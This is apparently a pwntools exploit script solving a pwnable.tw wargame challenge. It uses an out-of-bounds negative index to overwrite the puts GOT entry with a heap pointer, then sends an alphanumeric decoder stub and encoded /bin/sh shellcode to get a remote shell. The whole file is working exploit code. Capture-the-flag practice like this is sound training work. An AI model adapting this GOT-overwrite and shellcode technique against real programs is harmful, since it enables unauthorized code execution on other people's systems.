from pwn import *

# Arbitrary write
# strdup puts shellcode on heap
# Overwrite GOT with pointer returned by strdup()
# overwritten GOT gets executed and executes strdup'd string on heap
# Stub decodes binsh payload and executes it

# Alphanumeric decoder stub
stub = (
    "\x6a\x69"
    "\x5b"
    "\x28\x5a\x31"
    "\x28\x5a\x3d"
    "\x28\x5a\x3d"
    "\x28\x5a\x3e"
    "\x28\x5a\x3f"
    "\x28\x5a\x3f"
    "\x28\x5a\x41"
    "\x28\x5a\x42"
    "\x28\x5a\x43"
    "\x28\x5a\x44"
    "\x28\x5a\x45"
    "\x28\x5a\x46"
    "\x28\x5a\x47"
    "\x28\x5a\x48"
    "\x28\x5a\x48"
)

# /bin/sh shellcode decoded
sc = (
    "\x31"
    "\xc0" # + 1 | 0x29
    "\x50"
    "\x68\x2f\x2f\x73\x68"
    "\x68\x2f\x62\x69\x6e"
    "\x89" # + 12 | 0x5b
    "\xe3" # + 13 | 0x4c
    "\x99" # + 14 | 0x6b
    "\x31"
    "\xc9" # + 16 | 0x32
    "\xb8" # + 17 | 0x21
    "\x0b" # + 18 | 0x74
    "\x00\x00\x00" # + 19 -> 21 | 0x69
    "\xcd" # + 22 | 0x36
    "\x80" # + 23 | 0x52
)

# /bin/sh shellcode encoded
sc = (
    "\x31"
    "\x29"
    "\x50"
    "\x68\x2f\x2f\x73\x68"
    "\x68\x2f\x62\x69\x6e"
    "\x5b"
    "\x4c"
    "\x6b"
    "\x31"
    "\x32"
    "\x21"
    "\x74"
    "\x69\x69\x69"
    "\x36"
    "\x52")

r = remote("chall.pwnable.tw",10201)
r.recv(1024) # Banner
r.sendline("1") # Add note
r.recvuntil("Index :")
r.sendline("-16") # Overwrite GOT entry of puts
r.recvuntil("Name :")
r.sendline(stub+sc) # Send alphanumeric shellcode
print("[+] Shell!")
r.interactive()
